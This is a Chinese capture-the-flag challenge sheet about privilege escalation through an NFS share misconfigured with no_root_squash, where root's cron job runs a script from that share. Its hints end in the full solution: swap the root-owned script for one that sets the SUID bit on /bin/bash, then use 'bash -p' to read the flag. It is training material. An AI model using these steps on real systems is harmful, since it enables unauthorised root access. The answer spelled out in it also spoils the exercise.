# 第 8 题：别人家的共享目录 —— NFS root_squash 没配

## 场景

这是一台**文件服务器**。`/srv/nfs-share` 通过 NFS 导出给内网：

```
/srv/nfs-share 192.168.0.0/16(rw,sync,no_root_squash,insecure)
```

注意 `no_root_squash` —— 它意味着**客户端以 root 写入的文件，在服务器上仍然属于 root**。

root 的计划任务每分钟重新挂载（同步）这个共享，然后**直接从共享里执行**健康检查脚本
`/srv/nfs-share/share-check.sh`。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22008 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 本机导出了哪些目录？选项各是什么意思？
   ```bash
   cat /etc/exports
   ls -l /srv/nfs-share/
   ```
2. `no_root_squash` 和默认的 `root_squash` 有什么区别？
   （提示：客户端 root 的文件到了服务端会变成 `nobody` 还是保持 `root`？）
3. 共享目录本身的权限是什么？你在共享目录里**能不能删除/替换**一个 root 的文件？
   ```bash
   id
   ls -ld /srv/nfs-share
   ```
4. root 每分钟执行的脚本**就在共享目录里**——它是什么权限？谁在保护它？
5. 目录没有 sticky 位（不像 `/tmp`），所以你能**删除 root 的文件**。把它换成自己的同名脚本：
   ```bash
   rm -f /srv/nfs-share/share-check.sh
   cat > /srv/nfs-share/share-check.sh <<'EOF'
   #!/bin/bash
   chmod 4755 /bin/bash
   EOF
   chmod +x /srv/nfs-share/share-check.sh
   ```
   等 1 分钟后：
   ```bash
   /bin/bash -p
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
